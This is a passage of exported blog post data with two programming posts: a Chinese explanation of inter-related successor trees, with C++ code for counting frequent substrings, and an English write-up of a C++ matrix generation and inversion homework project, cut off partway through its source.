alt=\"\"></p>\n<p>大体解释一下这个例子吧。全文是abcabaabc，首先从a开始，下边走第一个分支是(b,1)，表示下边一个字符是b开头的树的第一个分支，我们来到根为b的这个树，看到第一个分支是(c,1)，说明下一个是c为根的第一个分支，所以就是走到c树，看到第一个分支是(a,2)，说明下一个字符是a的第二个分支，然后我们来到了a的第二个分支，发现是(b,2)，说明下一个是b的第二个分支。以此类推。</p>\n<p>这么做有什么好处呢？我们来看看这个树首先干了什么吧。所谓<strong>互关联后继树</strong>，他就是一颗后继树。说白了呢就是标明了每个字符位置的后继位置。用二元组的方式，标出了后继字符在这个字符的第几次出现。假如说是a为根的树，下边有一个(b,2)，就说明现在这个位置，下一个字符是b，而且这个b是全文第二个b。</p>\n<p>这样子下来呢，就很容易找到某个字符一共出现了多少次（树的叶子节点的大小），以及后继结点的标号以及出现在什么位置。甚至进一步的运用，可以涉及到识别字串出现的次数。</p>\n<p>这里先说一下具体生成这棵树的方法。</p>\n<p><img src=\"/image/20150209005837.png\" alt=\"\"><br><img src=\"/image/20150209005849.png\" alt=\"\"></p>\n<p>具体代码实现的时候会有点变化。因为我在写代码的时候发现先做第四步，在前驱节点树的节点添加会更快捷方便。所以我的代码写成了这样。</p>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title\">while</span>(!input.eof())&#123;</span><br><span class=\"line\">        input &gt;&gt; <span class=\"type\">N</span>[i].length &gt;&gt; <span class=\"type\">N</span>[i].<span class=\"class\"><span class=\"keyword\">data</span>;</span></span><br><span class=\"line\">        //添加到上一个节点树</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i)&#123;</span><br><span class=\"line\">            temp = get(<span class=\"type\">N</span>[i - <span class=\"number\">1</span>].<span class=\"class\"><span class=\"keyword\">data</span>);</span></span><br><span class=\"line\">            <span class=\"type\">SI</span>[temp].child[<span class=\"type\">SI</span>[temp].child.size() - <span class=\"number\">1</span>].<span class=\"class\"><span class=\"keyword\">data</span> = <span class=\"type\">N</span>[i].<span class=\"keyword\">data</span>;</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(get(<span class=\"type\">N</span>[i].<span class=\"class\"><span class=\"keyword\">data</span>) != -1) <span class=\"type\">SI</span>[temp].child[<span class=\"type\">SI</span>[temp].child.size() - 1].pos = <span class=\"type\">SI</span>[get(<span class=\"type\">N</span>[<span class=\"title\">i</span>].<span class=\"title\">data</span>)].child.size();</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span> <span class=\"type\">SI</span>[temp].child[<span class=\"type\">SI</span>[temp].child.size() - <span class=\"number\">1</span>].pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // 添加本节点树</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(get(<span class=\"type\">N</span>[i].<span class=\"class\"><span class=\"keyword\">data</span>) == -1)&#123;</span><br><span class=\"line\">            <span class=\"type\">TSI</span>.<span class=\"title\">child</span>.<span class=\"title\">clear</span>();</span><br><span class=\"line\">            <span class=\"type\">TSI</span>.<span class=\"title\">id</span> = <span class=\"type\">N</span>[<span class=\"title\">i</span>].<span class=\"title\">data</span>;</span><br><span class=\"line\">            <span class=\"type\">SI</span>[<span class=\"title\">cnt</span> ++] = <span class=\"type\">TSI</span>;</span><br><span class=\"line\">        &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        temp = get(<span class=\"type\">N</span>[i].<span class=\"class\"><span class=\"keyword\">data</span>);</span></span><br><span class=\"line\">        <span class=\"type\">TNo</span>.length = <span class=\"type\">N</span>[i].length;</span><br><span class=\"line\">        <span class=\"type\">TNo</span>.<span class=\"class\"><span class=\"keyword\">data</span> = -1;</span></span><br><span class=\"line\">        <span class=\"type\">TNo</span>.pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"type\">SI</span>[temp].child.push_back(<span class=\"type\">TNo</span>);</span><br><span class=\"line\">        ++ i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个代码呐，一会会放出能运行的完整版本。先凑合看吧。</p>\n<p>##具体应用##<br>这里重点记录一个应用，就是说寻找所谓的频繁因子吧。别管这个因子是什么。能寻找出频繁存在的串。</p>\n<p>这种东西，借鉴一下一个概念，所谓SIRST，<strong>时序互关联后继树</strong>，听起来如何的高大上，其实道理很简单。就是在IRST的节点二元组(a,1)类似的东西前边，加上一个属于这个二元组的label，我们可以计算出这个label出现的次数大约多少次的串等等。</p>\n<p>好处是每个串只需要计算一次。因为我们这样子很轻松的能统计出来串出现的次数。比方说刚刚的例子，我们要统计一下ab这个串出现的次数，只需要从a开始，计算一下孩子结点中b的个数就行了。另外如果要求abc这个串出现的次数，那我们就从a开始，递归的求下去就行了。这里不多说了，从a开始，找到孩子中有b的叶子，假如说是(b,1)(b,2),我们接着去b树里边找1，2分支的，如果有c就继续递归就好了。这样统计字串个数倒是挺简单的。</p>\n<p>这里我写的示例程序，主要是解决找label出现次数多余Fmin的子串。不断的递归寻找，最后输出找到的子串以及对应的次数。</p>\n<p>目前发现这个奇怪的树的作用也就是找子串出现次数很有意思。</p>\n<figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fstream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 100</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> Fmin = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"keyword\">int</span> cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> Node&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> length;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> data;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> pos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> SIRST&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> id;</span><br><span class=\"line\">    vector&lt;Node&gt; child;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">SIRST SI[MAX];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> <span class=\"built_in\">get</span>(<span class=\"keyword\">int</span> data)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; cnt;++ i)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(SI[i].id == data) <span class=\"built_in\">return</span> i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">string</span> getstring(<span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">string</span> temp = <span class=\"string\">\"\"</span>,temp1 = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(n)&#123;</span><br><span class=\"line\">        temp1 += (n % <span class=\"number\">10</span>) + <span class=\"string\">'0'</span>;</span><br><span class=\"line\">        n /= <span class=\"number\">10</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = temp1.length() - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">        temp += temp1[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> getres(<span class=\"keyword\">string</span> now, vector&lt;<span class=\"keyword\">int</span>&gt; it, <span class=\"keyword\">int</span> root)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num_l[MAX];</span><br><span class=\"line\">    memset(num_l,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(num_l));</span><br><span class=\"line\">    vector&lt;<span class=\"keyword\">int</span>&gt; next[MAX];</span><br><span class=\"line\">    <span class=\"keyword\">string</span> newnow = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; it.<span class=\"built_in\">size</span>();++ i)&#123;</span><br><span class=\"line\">        num_l[SI[root].child[it[i]].length] ++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; MAX - <span class=\"number\">10</span> ; ++ i)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(num_l[i] &amp;&amp; (num_l[i] &gt;= Fmin))&#123;</span><br><span class=\"line\">           newnow = now + <span class=\"string\">\"(\"</span>;</span><br><span class=\"line\">           newnow += getstring(i) + <span class=\"string\">','</span>;</span><br><span class=\"line\">           newnow += getstring(SI[root].id) + <span class=\"string\">')'</span>;</span><br><span class=\"line\">           cout &lt;&lt; newnow &lt;&lt; <span class=\"string\">\"  \"</span> &lt;&lt; num_l[i] &lt;&lt; endl;</span><br><span class=\"line\">            <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; it.<span class=\"built_in\">size</span>();++ j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> temp = it[j];</span><br><span class=\"line\">                <span class=\"built_in\">if</span>(SI[root].child[temp].length == i)&#123;</span><br><span class=\"line\">                    next[<span class=\"built_in\">get</span>(SI[root].child[temp].data)].push_back(SI[root].child[temp].pos);</span><br><span class=\"line\">                    <span class=\"comment\">//cout &lt;&lt; \"pos\" &lt;&lt; SI[root].child[temp].pos &lt;&lt; endl;</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; cnt;++ j)&#123;</span><br><span class=\"line\">                <span class=\"built_in\">if</span>(next[j].<span class=\"built_in\">size</span>() &gt;= Fmin)&#123;</span><br><span class=\"line\">                    getres(newnow, next[j], j);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                next[j].<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> main()&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    Node N[<span class=\"number\">1000</span>],TNo;</span><br><span class=\"line\">    SIRST TSI;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> temp;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> temp1;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Please input the Fmin\\n\"</span>);</span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;Fmin);</span><br><span class=\"line\">    ifstream input;</span><br><span class=\"line\">    input.<span class=\"built_in\">open</span>(<span class=\"string\">\"in.txt\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">//freopen(\"out.txt\",\"w\",stdout);</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//算法一</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">while</span>(!input.eof())&#123;</span><br><span class=\"line\">        input &gt;&gt; N[i].length &gt;&gt; N[i].data;</span><br><span class=\"line\">        <span class=\"comment\">//添加到上一个节点树</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(i)&#123;</span><br><span class=\"line\">            temp = <span class=\"built_in\">get</span>(N[i - <span class=\"number\">1</span>].data);</span><br><span class=\"line\">            SI[temp].child[SI[temp].child.<span class=\"built_in\">size</span>() - <span class=\"number\">1</span>].data = N[i].data;</span><br><span class=\"line\">            <span class=\"built_in\">if</span>(<span class=\"built_in\">get</span>(N[i].data) != <span class=\"number\">-1</span>) SI[temp].child[SI[temp].child.<span class=\"built_in\">size</span>() - <span class=\"number\">1</span>].pos = SI[<span class=\"built_in\">get</span>(N[i].data)].child.<span class=\"built_in\">size</span>();</span><br><span class=\"line\">            <span class=\"built_in\">else</span> SI[temp].child[SI[temp].child.<span class=\"built_in\">size</span>() - <span class=\"number\">1</span>].pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 添加本节点树</span></span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">get</span>(N[i].data) == <span class=\"number\">-1</span>)&#123;</span><br><span class=\"line\">            TSI.child.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">            TSI.id = N[i].data;</span><br><span class=\"line\">            SI[cnt ++] = TSI;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        temp = <span class=\"built_in\">get</span>(N[i].data);</span><br><span class=\"line\">        TNo.length = N[i].length;</span><br><span class=\"line\">        TNo.data = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        TNo.pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        SI[temp].child.push_back(TNo);</span><br><span class=\"line\">        ++ i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; cnt;++ i)&#123;</span><br><span class=\"line\">        printf(<span class=\"string\">\"%d\\n\"</span>,SI[i].id);</span><br><span class=\"line\">        <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; SI[i].child.<span class=\"built_in\">size</span>();++ j)&#123;</span><br><span class=\"line\">            printf(<span class=\"string\">\"(%d,%d,%d) \"</span>,SI[i].child[j].length,SI[i].child[j].data,SI[i].child[j].pos == <span class=\"number\">-1</span> ? <span class=\"number\">-1</span> : (SI[i].child[j].pos + <span class=\"number\">1</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//算法二</span></span><br><span class=\"line\">    vector&lt;<span class=\"keyword\">int</span>&gt; VTemp;</span><br><span class=\"line\">    <span class=\"keyword\">string</span> STemp = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; cnt;++ i)&#123;</span><br><span class=\"line\">        VTemp.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">        <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;j &lt; SI[i].child.<span class=\"built_in\">size</span>();++ j)&#123;</span><br><span class=\"line\">            VTemp.push_back(j);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        getres(STemp,VTemp,i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如有问题，欢迎提出。</p>"},{"title":"Matrix invert","date":"2015-10-07T20:25:18.000Z","_content":"Author: Song Li\n[Download Project](/download/Matrix-invert.zip)\n##AIM##\nThis program is used to generate, invert matrix. Just use row addups and swaps rows randomly to generate a invertable matrix.\n<!--more-->\n##USAGE##\n- Invert Matrix: To use the invert function, users need to input the Maxtric File right after the program. Here is an example: $$./debug/invert~./debug/input$$\n- Generate Matrix: To use the generate function, users need to input $-g$ after the program and the size of matrix after the $-g$. Here is an example:\n$$./debug/invert~-g~3$$\nThis command will generate a $3*3$ matrix, and this maxtrix will be output to the terminal and stored in the $./debug/generate$ file at the same time.\n##COMPILE##\nJust use $make$ in the root dir of this program to compile this program. I didn't modify the $Makefile$\n##FILE STRUCTURE##\n- Makefile\n- README.pdf\n- debug/: contains the runable program and generated matrix\n- matrix1-sol315.txt\n- matrix2-sol315.txt\n- object/\n- pivoting-sol315.txt\n- source/main.cpp: main code of this program\n- source/StdAfx.cpp: useless\n- source/StdAfx.h: head file \n- source/parseMatrix.cpp: this code is used to input and output the matrix\n- source/parseMatrix.h: head file of paraseMatrix.cpp\n##RESULT##\nMost of the result will be output directely in the terminal. The generated matrix will be output in both terminal and $/debug/generate$ file.\n##DESIGN##\nIn this part, I mainly talk about how I generate a matrix which is invertable. \nFirstly, I generate a matrix which is random double numbers in the diagonal line, and other numbers are all 0. Like this:\n$$\n\\begin{bmatrix}\n1.231 & 0.000 & 0.000 & 0.000 \\\\\\\\\n0.000 & 1.002 & 0.000 & 0.000 \\\\\\\\\n0.000 & 0.000 & 1923.412 & 0.000 \\\\\\\\\n0.000 & 0.000 & 0.000 & 0.023 \\\\\\\\\n\\end{bmatrix}\n$$\n\nAfter that, I randomly pick a line, use a random double number times every number of this line, and add it to another random line.If I pick line 2 and number 2, and add this line to the 4th line. The result will be like\n$$\n\\begin{bmatrix}\n1.231&0.000&0.000&0.000 \\\\\\\\\n0.000&1.002&0.000&0.000 \\\\\\\\\n0.000&0.000&1923.412&0.000 \\\\\\\\\n0.000&2.004&0.000&0.023 \\\\\\\\\n\\end{bmatrix}\n$$\nSome times later, we can get a random matrix. Generately speaking, we can get every matrix in this way.\n\nMain function code is here. The whole project can be downloaded from the link at the begining of this blog.\n\n```\n\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n//Implementation for the Main method\n////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n#include \"StdAfx.h\"\n\n\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\ninline double getRandDouble(){\n    return (double)rand() / (double)rand() * (double)((rand() & 1 << 1) - 1);\n}\nvoid defaultOutput()\n{\n\t\tprintf(\"\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"## 411 Homework: Numerical Analysis                    ##\\n\");\n\t\tprintf(\"## Brian Chen, Oct 20, 2012                            ##\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"Usage:\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"invert \\n\");\n\t\tprintf(\"With no arguments, invert returns this usage statement.\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"invert <filename>\\n\");\n\t\tprintf(\"Prints out two matrix inverses for the provided matrix.\\n\");\n\t\tprintf(\" -- the first inverse is computed with simple inversion.\\n\");\n\t\tprintf(\" -- the second is computed with partial pivoting\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"invert -format\\n\");\n\t\tprintf(\"Describes the file format for the input file.\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"\\n\");\n\t\texit(0);\n}\n\nvoid fileFormat()\n{\n\t\tprintf(\"\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"## 411 Homework: Numerical Analysis                    ##\\n\");\n\t\tprintf(\"## Brian Chen, Oct 20, 2012                            ##\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"File format for a 3rd order matrix (input):\\n\");\n\t\tprintf(\" - numbers below are space deliminated.  no tabs.\\n\");\n\t\tprintf(\" - There are three lines, each with 3 numbers.\\n\");\n\t\tprintf(\" - They will be parsed as doubles.\\n\");\n\t\tprintf(\" - Comment lines start with #.  Comment lines cannot.\\n\");\n\t\tprintf(\"   interrupt the 3 lines with the matrix, but can come.\\n\");\n\t\tprintf(\"   before or after.\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"---- Matrix file below, not including this line ----\\n\");\n\t\tprintf(\"# comment\\n\");\n\t\tprintf(\"# comment\\n\");\n\t\tprintf(\"1.2 3.3 4.4\\n\");\n\t\tprintf(\"1.112 2.24 0\\n\");\n\t\tprintf(\"3.4 2.2 98.23452\\n\");\n\t\tprintf(\"#\\n\");\n\t\tprintf(\"#\\n\");\n\t\tprintf(\"---- Matrix file above, not including this line ----\\n\");\n\t\tprintf(\"\\n\");\n\t\tprintf(\"#########################################################\\n\");\n\t\tprintf(\"\\n\");\n\t\texit(0);\n}\n\n\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\n\n//Inside the result, the result is to be stored as:\n//i=0 i=1 i=2\n//[0] [3] [6]  //j=0\n//[1] [4] [7]  //j=1\n//[2] [5] [8]  //j=2\n//\n//where the above 3x3 matrix is as you would write it on paper.\n//\n\n\n/**\n * this function is mainly used for debug. we can use it to output\n *\n * @param m: the matrix that needed to be output\n *        size: the size of matrix\n * @return NULL\n **/\nvoid output(double  ** m,int size){\n    if(DEBUG == 0) return ;//Debug is defined in StdAfx.h \n    for(int i = 0;i < size;++ i){\n        for(int j = 0;j < size + size;++ j){\n            if(j == size) printf(\"|\\t\");\n            printf(\"%f\\t\",m[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    printf(\"\\n\");\n\n}\n\n/**\n * this function is mainly used to swap two lines in a matrix\n *\n * @param matrix: the matrix that needed to be swaped\n *        a: the first line which should be swaped\n *        b: the second line which should be swaped\n *        size: the size of the matrix\n * @return NULL\n **/\n\nvoid swap(double ** matrix,int a,int b,int size){\n    output(matrix,size);\n    double tmp[1000];\n    memcpy(tmp,matrix[a],size * 2 * sizeof(double));\n    memcpy(matrix[a],matrix[b], size * 2 * sizeof(double));\n    memcpy(matrix[b],tmp,size * 2 * sizeof(double));\n    output(matrix,size);\n    return ;\n}\n\n\n/**\n * this function is used to get the Max line of the matrix and swap it to the first line\n *\n * @param tmp: the matrix\n *        k: the col that we should find the max line\n *        size: the size of matrix\n * @return NULL\n **/\nvoid getMax(double ** tmp, int k,int size){\n    int Max = k;\n    for(int i = k + 1;i < size;++ i){\n        if(fabs(tmp[i][k]) > fabs(tmp[Max][k])) Max = i; //get the max line\n    }\n    if(Max != k) {\n        swap(tmp,Max,k,size);\n    }\n    return ;\n}\n\n/**\n * this function is used to do the most important things, invert the matrix\n *\n * @param matrix: the matrix that needed to be inverted\n *        type: it is the simple one or pivot one\n *              1: pivot 2:simple\n *        size: the size of matrix;\n **/ \ndouble ** runTmp(double ** matrix, bool type,int size){\n\tint i = 0;\n    double div;\n\n    double ** tmp = new double*[size];\n\n    for(i = 0;i < size;i ++){\n        tmp[i] = new double[size + size];\n    }\n\n\n    for(i = 0;i < size;++ i){//read matrix into tmp matrix and add i after matrix\n        for(int j = 0;j < size + size;++ j){\n            if(j < size) tmp[i][j] = matrix[i][j];\n            